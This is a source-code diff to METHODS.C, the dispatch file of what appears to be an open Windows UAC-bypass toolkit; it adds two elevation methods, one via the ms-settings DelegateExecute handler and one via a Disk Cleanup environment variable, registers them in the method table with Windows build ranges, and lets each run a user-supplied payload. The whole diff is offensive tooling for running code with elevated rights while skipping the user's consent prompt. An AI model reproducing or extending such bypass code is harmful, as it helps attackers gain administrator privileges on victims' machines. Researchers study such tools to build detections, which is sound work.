@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     2.71
+*  VERSION:     2.72
 *
-*  DATE:        06 May 2017
+*  DATE:        26 May 2017
 *
 *  UAC bypass dispatch.
 *
@@ -44,6 +44,8 @@ UCM_API(MethodEnigma0x3_3);
 UCM_API(MethodWow64Logger);
 UCM_API(MethodEnigma0x3_4);
 UCM_API(MethodUiAccess);
+UCM_API(MethodMsSettings);
+UCM_API(MethodTyranid);
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodTest, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
@@ -73,12 +75,14 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodComet, NULL, { 7600, 15031 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodEnigma0x3, NULL, { 7600, 15031 }, FUBUKI_ID, FALSE, TRUE, FALSE },
     { MethodEnigma0x3_2, NULL, { 7600, 15031 }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodExpLife, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodExpLife, NULL, { 7600, 16199 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodSandworm, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodEnigma0x3_3, NULL, { 10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodWow64Logger, NULL, { 7600, MAXDWORD }, AKATSUKI_ID, FALSE, TRUE, TRUE },
     { MethodEnigma0x3_4, NULL, {10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodUiAccess, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
+    { MethodUiAccess, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodMsSettings, NULL, { 10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodTyranid, NULL, { 10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }
 };
 
 /*
@@ -622,4 +626,41 @@ UCM_API(MethodUiAccess)
     UNREFERENCED_PARAMETER(ExtraContext);
 
     return ucmUiAccessMethod(PayloadCode, PayloadSize);
+}
+
+UCM_API(MethodMsSettings)
+{
+    LPWSTR lpszPayload = NULL;
+
+    UNREFERENCED_PARAMETER(Method);
+    UNREFERENCED_PARAMETER(ExtraContext);
+    UNREFERENCED_PARAMETER(PayloadCode);
+    UNREFERENCED_PARAMETER(PayloadSize);
+
+    if (g_ctx.OptionalParameterLength == 0)
+        lpszPayload = NULL;
+    else
+        lpszPayload = g_ctx.szOptionalParameter;
+
+    return ucmMsSettingsDelegateExecuteMethod(lpszPayload);
+}
+
+UCM_API(MethodTyranid)
+{
+    LPWSTR lpszPayload = NULL;
+
+    UNREFERENCED_PARAMETER(Method);
+    UNREFERENCED_PARAMETER(ExtraContext);
+    UNREFERENCED_PARAMETER(PayloadCode);
+    UNREFERENCED_PARAMETER(PayloadSize);
+
+    //
+    // Select target application or use given by optional parameter.
+    //
+    if (g_ctx.OptionalParameterLength == 0)
+        lpszPayload = NULL;
+    else
+        lpszPayload = g_ctx.szOptionalParameter;
+
+    return ucmDiskCleanupEnvironmentVariable(lpszPayload);
 }
